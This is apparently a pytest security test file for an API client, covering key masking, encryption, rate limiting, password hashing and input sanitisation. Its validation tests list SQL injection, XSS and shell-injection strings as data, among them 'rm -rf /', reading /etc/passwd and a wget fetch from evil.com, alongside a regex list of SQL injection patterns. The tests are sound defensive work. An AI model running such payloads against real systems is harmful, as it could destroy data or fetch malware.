"""Security tests for API key handling.

Tests for ensuring API keys are properly protected:
- Keys not logged
- Keys encrypted at rest
- Keys not exposed in error messages
- Keys masked in debug output
"""

import json
import logging
import re

import pytest


class TestAPIKeyNotLogged:
    """Tests ensuring API keys are not leaked in logs."""

    def test_api_key_not_in_info_logs(self, caplog):
        """API keys should not appear in INFO level logs."""
        test_api_key = "test_secret_key_12345"
        test_public_key = "test_public_key_67890"

        # Simulate logging with key
        with caplog.at_level(logging.INFO):
            logging.info("Processing request for user")
            logging.info("Request params: game=csgo, limit=10")

        # Check that keys are not in logs
        log_text = caplog.text
        assert test_api_key not in log_text
        assert test_public_key not in log_text

    def test_api_key_masked_in_debug_output(self):
        """API keys should be masked when printed for debugging."""

        def mask_api_key(key: str) -> str:
            """Mask API key for safe display."""
            if not key or len(key) < 8:
                return "***"
            return f"{key[:4]}...{key[-4:]}"

        test_key = "sk_live_abc123xyz789_secret"
        masked = mask_api_key(test_key)

        assert "sk_l" in masked  # First 4 chars
        assert "cret" in masked  # Last 4 chars
        assert "abc123xyz789" not in masked  # Middle part hidden

    def test_api_key_not_in_exception_messages(self):
        """API keys should not appear in exception messages."""
        test_api_key = "secret_api_key_12345"

        def simulate_api_error(key: str):
            """Simulate an API error without exposing key."""
            # Bad practice - don't do this:
            # raise ValueError(f"Invalid API key: {key}")

            # Good practice:
            raise ValueError("Invalid API key provided")

        with pytest.raises(ValueError) as exc_info:
            simulate_api_error(test_api_key)

        assert test_api_key not in str(exc_info.value)

    def test_api_key_not_serialized_to_json(self):
        """API keys should not be included in JSON serialization."""

        class SecureConfig:
            """Config class that excludes sensitive data from serialization."""

            def __init__(self, public_key: str, secret_key: str):
                self.public_key = public_key
                self._secret_key = secret_key  # Private attribute

            def to_dict(self) -> dict:
                """Serialize without secret key."""
                return {
                    "public_key": self.public_key,
                    "secret_key": "***REDACTED***",
                }

        config = SecureConfig("pub_123", "sec_456")
        serialized = json.dumps(config.to_dict())

        assert "sec_456" not in serialized
        assert "***REDACTED***" in serialized


class TestAPIKeyEncryption:
    """Tests for API key encryption at rest."""

    def test_api_key_encryption_basic(self):
        """Test basic encryption/decryption of API keys."""
        from base64 import b64decode, b64encode
        from hashlib import sha256

        def simple_encrypt(key: str, password: str) -> str:
            """Simple XOR-based encryption for demo (use proper crypto in prod)."""
            # Note: This is a simplified demo encryption for testing purposes only.
            # In production, use cryptography.fernet or similar proper encryption.
            key_bytes = key.encode()
            password_hash = sha256(password.encode()).digest()

            # XOR with cycling password hash - FOR TESTING ONLY
            encrypted = bytes(
                a ^ password_hash[i % len(password_hash)]
                for i, a in enumerate(key_bytes)
            )
            return b64encode(encrypted).decode()

        def simple_decrypt(encrypted: str, password: str) -> str:
            """Simple XOR-based decryption for demo - FOR TESTING ONLY."""
            encrypted_bytes = b64decode(encrypted.encode())
            password_hash = sha256(password.encode()).digest()

            decrypted = bytes(
                a ^ password_hash[i % len(password_hash)]
                for i, a in enumerate(encrypted_bytes)
            )
            return decrypted.decode()

        original_key = "my_secret_api_key"
        password = "encryption_password"

        encrypted = simple_encrypt(original_key, password)
        assert encrypted != original_key

        decrypted = simple_decrypt(encrypted, password)
        assert decrypted == original_key

    def test_encrypted_key_not_plaintext(self):
        """Encrypted API key should not contain plaintext."""
        from base64 import b64encode
        from hashlib import sha256

        original_key = "sk_live_abc123xyz"

        # Simulate encryption
        encrypted = b64encode(sha256(original_key.encode()).digest()).decode()

        # Original key should not be visible
        assert original_key not in encrypted
        assert "sk_live" not in encrypted


class TestInputValidation:
    """Tests for input validation and sanitization."""

    @pytest.mark.parametrize(
        "malicious_input",
        (
            "'; DROP TABLE users;--",
            "1 OR 1=1",
            "admin'--",  # Common SQL injection
            "; DELETE FROM orders WHERE 1=1;--",
            "UNION SELECT * FROM users--",
        ),
    )
    def test_sql_injection_prevention(self, malicious_input: str):
        """SQL injection attempts should be rejected."""

        def sanitize_input(user_input: str) -> str | None:
            """Sanitize user input to prevent SQL injection."""
            # Check for common SQL injection patterns
            dangerous_patterns = [
                r";\s*DROP",
                r";\s*DELETE",
                r";\s*UPDATE",
                r";\s*INSERT",
                r"OR\s+\d+\s*=\s*\d+",
                r"UNION\s+SELECT",
                r"--\s*$",
                r"'\s*--",  # Quote followed by comment
            ]

            for pattern in dangerous_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return None

            return user_input

        result = sanitize_input(malicious_input)
        assert result is None, f"Malicious input should be rejected: {malicious_input}"

    @pytest.mark.parametrize(
        ("malicious_input", "expected_safe"),
        (
            (
                "<script>alert('xss')</script>",
                "&lt;script&gt;alert('xss')&lt;/script&gt;",
            ),
            (
                "<img src=x onerror=alert('xss')>",
                "&lt;img src=x onerror=alert('xss')&gt;",
            ),
            ("javascript:alert('xss')", "javascript:alert('xss')"),  # No HTML tags
        ),
    )
    def test_xss_prevention(self, malicious_input: str, expected_safe: str):
        """XSS attempts should be sanitized."""
        import html

        sanitized = html.escape(malicious_input)

        # Should not contain unescaped HTML
        assert "<script>" not in sanitized
        assert "<img" not in sanitized or "&lt;img" in sanitized

    def test_command_injection_prevention(self):
        """Command injection attempts should be blocked."""
        malicious_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& wget http://evil.com/malware",
        ]

        def sanitize_shell_input(user_input: str) -> str | None:
            """Sanitize input for shell commands."""
            dangerous_chars = [";", "|", "$", "`", "&", ">", "<", "(", ")"]

            for char in dangerous_chars:
                if char in user_input:
                    return None

            return user_input

        for malicious in malicious_inputs:
            result = sanitize_shell_input(malicious)
            assert result is None, f"Command injection should be blocked: {malicious}"


class TestRateLimiting:
    """Tests for rate limiting security."""

    @staticmethod
    def _create_rate_limiter(max_requests: int, window_seconds: int):
        """Create a simple rate limiter for testing."""
        from collections import defaultdict
        from time import time

        class SimpleRateLimiter:
            """Simple rate limiter for testing."""

            def __init__(self, max_requests: int, window_seconds: int):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests: dict[str, list[float]] = defaultdict(list)

            def is_allowed(self, client_id: str) -> bool:
                """Check if request is allowed."""
                now = time()
                window_start = now - self.window_seconds

                # Clean old requests
                self.requests[client_id] = [
                    t for t in self.requests[client_id] if t > window_start
                ]

                if len(self.requests[client_id]) >= self.max_requests:
                    return False

                self.requests[client_id].append(now)
                return True

        return SimpleRateLimiter(max_requests, window_seconds)

    def test_rate_limiter_blocks_excessive_requests(self):
        """Rate limiter should block excessive requests."""
        limiter = self._create_rate_limiter(max_requests=5, window_seconds=60)
        client_id = "test_user_123"

        # First 5 requests should succeed
        for i in range(5):
            assert limiter.is_allowed(client_id), f"Request {i + 1} should be allowed"

        # 6th request should be blocked
        assert not limiter.is_allowed(client_id), "6th request should be blocked"

    def test_rate_limiter_per_user_isolation(self):
        """Rate limiting should be per-user."""
        limiter = self._create_rate_limiter(max_requests=3, window_seconds=60)

        # User A makes 3 requests
        for _ in range(3):
            assert limiter.is_allowed("user_a")

        # User A is now blocked
        assert not limiter.is_allowed("user_a")

        # User B should still be allowed (separate limit)
        assert limiter.is_allowed("user_b")


class TestSecureRandomness:
    """Tests for secure random number generation."""

    def test_api_key_generation_uses_secure_random(self):
        """API key generation should use cryptographically secure random."""
        import secrets

        def generate_api_key(length: int = 32) -> str:
            """Generate a cryptographically secure API key."""
            return secrets.token_hex(length // 2)

        key1 = generate_api_key()
        key2 = generate_api_key()

        # Keys should be unique
        assert key1 != key2

        # Keys should have expected length
        assert len(key1) == 32

        # Keys should be hex strings
        assert all(c in "0123456789abcdef" for c in key1)

    def test_token_generation_entropy(self):
        """Generated tokens should have sufficient entropy."""
        import secrets

        # Generate multiple tokens
        tokens = [secrets.token_hex(16) for _ in range(100)]

        # All tokens should be unique
        assert len(set(tokens)) == 100, "All tokens should be unique"


class TestAuthenticationSecurity:
    """Tests for authentication security."""

    def test_password_not_stored_plaintext(self):
        """Passwords should be hashed, not stored in plaintext."""
        import secrets
        from hashlib import pbkdf2_hmac

        def hash_password(
            password: str, salt: bytes | None = None
        ) -> tuple[bytes, bytes]:
            """Hash password using PBKDF2."""
            if salt is None:
                salt = secrets.token_bytes(16)

            hashed = pbkdf2_hmac(
                "sha256",
                password.encode(),
                salt,
                iterations=100000,
            )
            return hashed, salt

        def verify_password(password: str, hashed: bytes, salt: bytes) -> bool:
            """Verify password agAlgonst hash."""
            new_hash, _ = hash_password(password, salt)
            return secrets.compare_digest(hashed, new_hash)

        password = "my_secure_password"
        hashed, salt = hash_password(password)

        # Hash should not contain plaintext password
        assert password.encode() not in hashed
        assert password not in hashed.hex()

        # Verification should work
        assert verify_password(password, hashed, salt)
        assert not verify_password("wrong_password", hashed, salt)

    def test_timing_safe_comparison(self):
        """String comparisons should be timing-safe."""
        import secrets

        # Using secrets.compare_digest for timing-safe comparison
        token1 = "secret_token_123456"
        token2 = "secret_token_123456"
        token3 = "secret_token_654321"

        assert secrets.compare_digest(token1, token2)
        assert not secrets.compare_digest(token1, token3)


class TestSensitiveDataHandling:
    """Tests for sensitive data handling."""

    def test_sensitive_data_cleared_from_memory(self):
        """Sensitive data should be clearable from memory."""

        class SecureString:
            """String that can be securely cleared."""

            def __init__(self, value: str):
                self._value = bytearray(value.encode())

            def get_value(self) -> str:
                return self._value.decode()

            def clear(self):
                """Overwrite memory with zeros."""
                for i in range(len(self._value)):
                    self._value[i] = 0

        secret = SecureString("my_api_key")
        assert secret.get_value() == "my_api_key"

        secret.clear()
        assert secret.get_value() == "\x00" * len("my_api_key")

    def test_error_messages_dont_leak_sensitive_data(self):
        """Error messages should not contain sensitive data."""

        def authenticate(api_key: str) -> bool:
            """Authenticate with API key."""
            valid_key = "sk_live_correct_key"

            if api_key != valid_key:
                # Bad: raise ValueError(f"Invalid key: {api_key}")
                # Good:
                raise ValueError("Invalid API key provided")

            return True

        with pytest.raises(ValueError) as exc_info:
            authenticate("wrong_key_123")

        error_msg = str(exc_info.value)
        assert "wrong_key_123" not in error_msg
        assert "Invalid API key" in error_msg
